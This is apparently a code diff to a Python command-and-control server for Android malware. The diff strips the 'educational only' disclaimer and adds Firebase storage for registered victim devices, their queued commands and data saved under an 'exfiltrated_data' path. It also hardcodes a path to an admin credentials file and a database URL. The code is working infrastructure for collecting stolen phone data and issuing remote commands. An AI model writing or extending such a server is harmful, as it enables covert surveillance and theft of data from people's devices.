@@ -1,14 +1,6 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 
-"""
-C2 Server for Android Malware Education
-
-This is a simple Command & Control server designed to receive and display data
-collected from the educational Android app that demonstrates malicious functionality.
-
-EDUCATIONAL PURPOSE ONLY - DO NOT USE FOR MALICIOUS PURPOSES
-"""
 
 import argparse
 import base64
@@ -19,6 +11,9 @@ import os
 import socket
 import ssl
 import threading
+import firebase_admin
+from firebase_admin import credentials
+from firebase_admin import db
 import time
 import zlib
 from http.server import HTTPServer, BaseHTTPRequestHandler
@@ -35,13 +30,29 @@ logging.basicConfig(
 )
 logger = logging.getLogger("C2Server")
 
+FIREBASE_CRED_FILE = "C:\\Users\\tanwm\\Desktop\\databse-7d740-firebase-adminsdk-fbsvc-7aba2c03f2.json"
 # Constants
 DEFAULT_PORT = 42069
 # Use the directory where the script is located for data storage
 SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
 DATA_DIR = os.path.join(SCRIPT_DIR, "harvested_data")
 
-
+def initialize_firebase():
+    if not os.path.exists(FIREBASE_CRED_FILE):
+        logger.error(f"Firebase credentials file not found: {FIREBASE_CRED_FILE}")
+        return False
+    
+    try:
+        cred = credentials.Certificate(FIREBASE_CRED_FILE)
+        firebase_admin.initialize_app(cred, {
+            'databaseURL': 'https://databse-7d740-default-rtdb.asia-southeast1.firebasedatabase.app/'
+        })
+        logger.info("Firebase initialized successfully")
+        return True
+    except Exception as e:
+        logger.error(f"Firebase initialization error: {str(e)}")
+        return False
+    
 class C2RequestHandler(BaseHTTPRequestHandler):
     """
     HTTP Request handler for C2 server
@@ -286,48 +297,60 @@ class C2RequestHandler(BaseHTTPRequestHandler):
             self.send_header("Content-type", "application/json")
             self.end_headers()
             self.wfile.write(json.dumps({"status": "error", "message": str(e)}).encode())
-    
+
     def _handle_device_registration(self):
-        """Handle device registration requests"""
+        """Handle device registration requests and save to Firebase"""
         content_length = int(self.headers['Content-Length'])
         post_data = self.rfile.read(content_length)
-        
+
         try:
             data = json.loads(post_data.decode('utf-8'))
             device_id = data.get('device_id')
             device_info = data.get('device_info', {})
-            
+
             logger.info(f"Device registration: {device_id}")
-            
-            # Create devices directory
+
+            # Save to Firebase
+            device_ref = db.reference(f'devices/{device_id}')
+
+            device_data = {
+                "device_id": device_id,
+                "device_info": device_info,
+                "registration_time": datetime.datetime.now().isoformat(),
+                "last_seen": datetime.datetime.now().isoformat()
+            }
+
+            device_ref.set(device_data)
+
+            # Also save locally as backup
             devices_dir = os.path.join(DATA_DIR, "devices")
             os.makedirs(devices_dir, exist_ok=True)
-            
-            # Create commands directory
+
+            device_file = os.path.join(devices_dir, f"{device_id}.json")
+            with open(device_file, 'w') as f:
+                json.dump(device_data, f, indent=2)
+
+            # Initialize command node in Firebase if it doesn't exist
+            command_ref = db.reference(f'commands/{device_id}')
+            command_data = {"pending": [], "executed": []}
+
+            # Only set if it doesn't exist
+            if not command_ref.get():
+                command_ref.set(command_data)
+
+            # Also save locally
             commands_dir = os.path.join(DATA_DIR, "commands")
             os.makedirs(commands_dir, exist_ok=True)
-            
-            device_file = os.path.join(devices_dir, f"{device_id}.json")
-            
-            with open(device_file, 'w') as f:
-                json.dump({
-                    "device_id": device_id,
-                    "device_info": device_info,
-                    "registration_time": datetime.datetime.now().isoformat(),
-                    "last_seen": datetime.datetime.now().isoformat()
-                }, f, indent=2)
-            
-            # Initialize command file if it doesn't exist
+
             command_file = os.path.join(commands_dir, f"{device_id}.json")
-            if not os.path.exists(command_file):
-                with open(command_file, 'w') as f:
-                    json.dump({"pending": [], "executed": []}, f, indent=2)
-            
+            with open(command_file, 'w') as f:
+                json.dump(command_data, f, indent=2)
+
             # Respond with success and initial commands
             self.send_response(200)
             self.send_header("Content-type", "application/json")
             self.end_headers()
-            
+
             # Send initial commands to the device
             self.wfile.write(json.dumps({
                 "status": "success",
@@ -337,7 +360,7 @@ class C2RequestHandler(BaseHTTPRequestHandler):
                     {"command": "collect_info"}  # Request basic device info
                 ]
             }).encode())
-            
+
         except Exception as e:
             logger.error(f"Error processing device registration: {str(e)}")
             self.send_response(400)
@@ -377,65 +400,86 @@ class C2RequestHandler(BaseHTTPRequestHandler):
             self.send_header("Content-type", "application/json")
             self.end_headers()
             self.wfile.write(json.dumps({"status": "error", "message": str(e)}).encode())
-    
+
     def _save_received_data(self, json_data):
-        """Save received JSON data to appropriate files"""
+        """Save received JSON data to Firebase"""
         data_type = json_data.get('type', 'unknown')
         device_id = json_data.get('device_id', 'unknown_device')
-        timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
-        
-        # Create directory for this data type
-        data_dir = os.path.join(DATA_DIR, data_type)
-        os.makedirs(data_dir, exist_ok=True)
-        
-        # Save to file
-        file_path = os.path.join(data_dir, f"{device_id}_{timestamp}.json")
-        with open(file_path, 'w') as f:
-            json.dump(json_data, f, indent=2)
-        
-        logger.info(f"Saved {data_type} data to {file_path}")
-        
-        # Update device last seen time
-        self._update_device_last_seen(device_id)
-    
+        timestamp = datetime.datetime.now().isoformat()
+
+        try:
+            # Create reference to Firebase location
+            firebase_ref = db.reference(f'exfiltrated_data/{device_id}/{data_type}')
+
+            # Add timestamp to the data
+            json_data['received_timestamp'] = timestamp
+
+            # Push data to Firebase (generates unique key)
+            firebase_ref.push().set(json_data)
+
+            logger.info(f"Saved {data_type} data to Firebase for device {device_id}")
+
+            # Also save locally as backup
+            data_dir = os.path.join(DATA_DIR, data_type)
+            os.makedirs(data_dir, exist_ok=True)
+
+            # Save to file
+            file_path = os.path.join(data_dir, f"{device_id}_{timestamp.replace(':', '-')}.json")
+            with open(file_path, 'w') as f:
+                json.dump(json_data, f, indent=2)
+
+            # Update device last seen time
+            self._update_device_last_seen(device_id)
+        except Exception as e:
+            logger.error(f"Error saving data to Firebase: {str(e)}")
+
+            # Fallback to local storage only
+            data_dir = os.path.join(DATA_DIR, data_type)
+            os.makedirs(data_dir, exist_ok=True)
+
+            # Save to file
+            file_path = os.path.join(data_dir, f"{device_id}_{timestamp.replace(':', '-')}.json")
+            with open(file_path, 'w') as f:
+                json.dump(json_data, f, indent=2)
+
     def _update_device_last_seen(self, device_id):
-        """Update the last seen timestamp for a device"""
+        """Update the last seen timestamp for a device in Firebase"""
         if not device_id or device_id == "unknown_device":
             return
-        
-        # Create devices directory if it doesn't exist
-        devices_dir = os.path.join(DATA_DIR, "devices")
-        os.makedirs(devices_dir, exist_ok=True)
-            
-        device_file = os.path.join(devices_dir, f"{device_id}.json")
-        
-        if os.path.exists(device_file):
-            try:
-                with open(device_file, 'r') as f:
-                    device_data = json.load(f)
-                
-                device_data["last_seen"] = datetime.datetime.now().isoformat()
-                
-                with open(device_file, 'w') as f:
-                    json.dump(device_data, f, indent=2)
-            except Exception as e:
-                logger.error(f"Error updating device last seen: {str(e)}")
-        else:
-            # Create a new device entry
-            try:
+
+        try:
+            # Update in Firebase
+            devices_ref = db.reference(f'devices/{device_id}')
+
+            # Get current data if it exists
+            device_data = devices_ref.get()
+
+            if device_data:
+                # Update last seen
+                devices_ref.update({
+                    "last_seen": datetime.datetime.now().isoformat()
+                })
+            else:
+                # Create a new device entry
                 device_data = {
                     "device_id": device_id,
                     "device_info": {},
                     "registration_time": datetime.datetime.now().isoformat(),
                     "last_seen": datetime.datetime.now().isoformat()
                 }
-                
-                with open(device_file, 'w') as f:
-                    json.dump(device_data, f, indent=2)
-                
-                logger.info(f"Created new device entry for {device_id}")
-            except Exception as e:
-                logger.error(f"Error creating device entry: {str(e)}")
+                devices_ref.set(device_data)
+
+            # Also update local files as backup
+            devices_dir = os.path.join(DATA_DIR, "devices")
+            os.makedirs(devices_dir, exist_ok=True)
+
+            device_file = os.path.join(devices_dir, f"{device_id}.json")
+            with open(device_file, 'w') as f:
+                json.dump(device_data, f, indent=2)
+
+            logger.info(f"Updated device last seen in Firebase: {device_id}")
+        except Exception as e:
+            logger.error(f"Error updating device in Firebase: {str(e)}")
     
     def _get_pending_commands(self, device_id):
         """Get pending commands for a device"""
@@ -819,80 +863,7 @@ class WebAdminConsole:
             self.server.server_close()
             logger.info("Admin console stopped")
 
-
-def create_ssl_context(cert_file, key_file):
-    """Create SSL context for HTTPS server"""
-    context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
-    context.load_cert_chain(certfile=cert_file, keyfile=key_file)
-    return context
-
-
-def generate_self_signed_cert(cert_file="server.crt", key_file="server.key"):
-    """Generate a self-signed certificate if one doesn't exist"""
-    if os.path.exists(cert_file) and os.path.exists(key_file):
-        logger.info(f"Using existing certificate and key files: {cert_file}, {key_file}")
-        return (cert_file, key_file)
-    
-    try:
-        from cryptography import x509
-        from cryptography.x509.oid import NameOID
-        from cryptography.hazmat.primitives import hashes
-        from cryptography.hazmat.primitives.asymmetric import rsa
-        from cryptography.hazmat.primitives import serialization
-        import datetime
-        
-        # Generate private key
-        logger.info("Generating RSA private key...")
-        private_key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
-        
-        # Write private key to file
-        with open(key_file, "wb") as f:
-            f.write(private_key.private_bytes(
-                encoding=serialization.Encoding.PEM,
-                format=serialization.PrivateFormat.PKCS8,
-                encryption_algorithm=serialization.NoEncryption()
-            ))
-        
-        # Create self-signed certificate
-        logger.info("Creating self-signed certificate...")
-        subject = issuer = x509.Name([
-            x509.NameAttribute(NameOID.COUNTRY_NAME, "US"),
-            x509.NameAttribute(NameOID.STATE_OR_PROVINCE_NAME, "California"),
-            x509.NameAttribute(NameOID.LOCALITY_NAME, "San Francisco"),
-            x509.NameAttribute(NameOID.ORGANIZATION_NAME, "Educational Organization"),
-            x509.NameAttribute(NameOID.COMMON_NAME, "localhost"),
-        ])
-        
-        cert = x509.CertificateBuilder().subject_name(
-            subject
-        ).issuer_name(
-            issuer
-        ).public_key(
-            private_key.public_key()
-        ).serial_number(
-            x509.random_serial_number()
-        ).not_valid_before(
-            datetime.datetime.utcnow()
-        ).not_valid_after(
-            datetime.datetime.utcnow() + datetime.timedelta(days=365)
-        ).add_extension(
-            x509.SubjectAlternativeName([x509.DNSName("localhost")]),
-            critical=False
-        ).sign(private_key, hashes.SHA256())
-        
-        # Write certificate to file
-        with open(cert_file, "wb") as f:
-            f.write(cert.public_bytes(serialization.Encoding.PEM))
-        
-        logger.info(f"Self-signed certificate generated: {cert_file}, {key_file}")
-        return (cert_file, key_file)
-    except ImportError:
-        logger.error("Failed to generate certificate: cryptography module not available")
-        logger.info("Please install it with: pip install cryptography")
-        raise Exception("Failed to generate certificate: cryptography module not available")
-
-
-def run_c2_server(port, use_ssl=True, cert_file="server.crt", key_file="server.key"):
+def run_c2_server(port):
     """Run the C2 server"""
     # Create all required directories
     os.makedirs(DATA_DIR, exist_ok=True)
@@ -917,23 +888,7 @@ def run_c2_server(port, use_ssl=True, cert_file="server.crt", key_file="server.k
     
     # Create HTTPS server
     httpd = HTTPServer(('0.0.0.0', port), C2RequestHandler)
-    
-    if use_ssl:
-        # Generate or use existing certificate
-        cert_file, key_file = generate_self_signed_cert(cert_file, key_file)
-        
-        # Wrap socket with SSL
-        httpd.socket = ssl.wrap_socket(
-            httpd.socket,
-            keyfile=key_file,
-            certfile=cert_file,
-            server_side=True
-        )
-        
-        logger.info(f"C2 server running on https://0.0.0.0:{port}")
-    else:
-        logger.info(f"C2 server running on http://0.0.0.0:{port}")
-    
+
     # Start admin console
     admin_console = WebAdminConsole()
     admin_console.start()
@@ -953,10 +908,8 @@ if __name__ == "__main__":
     parser = argparse.ArgumentParser(description="C2 Server for Android Malware Education")
     parser.add_argument("--port", type=int, default=DEFAULT_PORT, help=f"Port to listen on (default: {DEFAULT_PORT})")
     parser.add_argument("--no-ssl", action="store_true", help="Disable SSL (not recommended)")
-    parser.add_argument("--cert", type=str, default="server.crt", help="SSL certificate file")
-    parser.add_argument("--key", type=str, default="server.key", help="SSL key file")
     
     args = parser.parse_args()
     
     # Run server
-    run_c2_server(args.port, not args.no_ssl, args.cert, args.key)
+    run_c2_server(args.port)
